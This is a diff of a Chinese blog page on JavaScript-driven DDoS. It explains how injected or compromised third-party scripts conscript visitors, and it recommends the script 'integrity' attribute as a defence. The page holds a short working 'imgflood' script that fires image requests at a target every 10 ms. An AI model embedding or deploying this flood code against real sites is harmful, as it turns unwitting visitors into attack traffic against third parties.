@@ -520,17 +520,27 @@
 <p>　　现在网站的交互性都是通过JavaScript来实现的。通过添加JavaScript直接插入HTML元素，或通过远程来加载JavaScript。浏览器会读取script标签中的src属性并运行它所指向的脚本，其实不只是script标签可以用来攻击，简单来说只要是可以跨域访问的标签，如img，link等都可以实现DDos攻击。</p>
 <p>　　既然这些标签可以访问外站的资源，那么我们是不是就可以设个定时器无限访问这个网站，从而达到攻击呢，那是肯定的。</p>
 </blockquote>
-<p><img src="/2019/12/12/DDoS-Javascript/1.jpg"></p>
+<img src="/2019/12/12/DDoS-Javascript/1.jpg">
+
 <p>如果攻击者在一个网站中嵌入了恶意JavaScript脚本，那么该网站的每一个访客都将成为DDoS攻击中的一员。网站流量越高就意味着DDoS越严重。</p>
 <p><strong>入侵共享JavaScript的第三方服务器</strong></p>
 <p>许多网站使用的都是普通的JavaScript库，为了节约带宽、提升性能，通常还会将JavaScript脚本共享在第三方服务器上。也就是说如果网站上包含有指向第三方服务器的脚本标签，就意味着所有访问该网站的用户都将自动下载JavaScript脚本，并执行。不幸的是，如果攻击者入侵了该第三方服务器并在JavaScript脚本中注入了DDoS攻击代码，那结果可想而知了，所有的访客也将变成DDoS攻击中的一员。</p>
 <p>一段简单的JS代码就能发起DoS攻击</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=<span class="string">'text/javascript'</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgflood</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//var TARGET = 'victim-website.com'</span></span><br><span class="line">	<span class="keyword">var</span> TARGET = <span class="string">"127.0.0.1:12345"</span></span><br><span class="line">	<span class="keyword">var</span> URI = <span class="string">'/index?'</span></span><br><span class="line">	<span class="keyword">var</span> pic = <span class="keyword">new</span> Image()</span><br><span class="line">	<span class="keyword">var</span> rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">1000</span>)</span><br><span class="line">	pic.src = <span class="string">'http://'</span>+TARGET+URI+<span class="string">'val='</span>+rand</span><br><span class="line">	<span class="comment">//pic.src = 'http://'+TARGET+URI+'val='+rand</span></span><br><span class="line">&#125;</span><br><span class="line">setInterval(imgflood, <span class="number">10</span>)</span><br><span class="line">alert(pic.src)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">f*********************king</span><br><span class="line">&lt;script type=<span class="string">'text/javascript'</span>&gt;imgflood()&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>
+
+
+
 <p><code>setInterval(code, millisec)</code>:以millisec 毫秒的间隔执行code</p>
 <p>由于大部分网页引用jquery是从外部引用的，因此可以从此发起中间人攻击</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-1.10.2.min.js"</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure>
+
 <p>预防的话，就是通过script标签支持的属性integrity：这个属性支持验证该js脚本的hash值，确保不会引用来自外部恶意的js脚本</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-1.10.2.min.js"</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">integrity</span>=<span class="string">"sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg="</span></span></span><br><span class="line"><span class="tag">         <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <p>中间人攻击示意图：攻击其中的请求外部js的途径</p>
 <p><img src="/2019/12/12/DDoS-Javascript/2.jpg" alt></p>
 <hr>
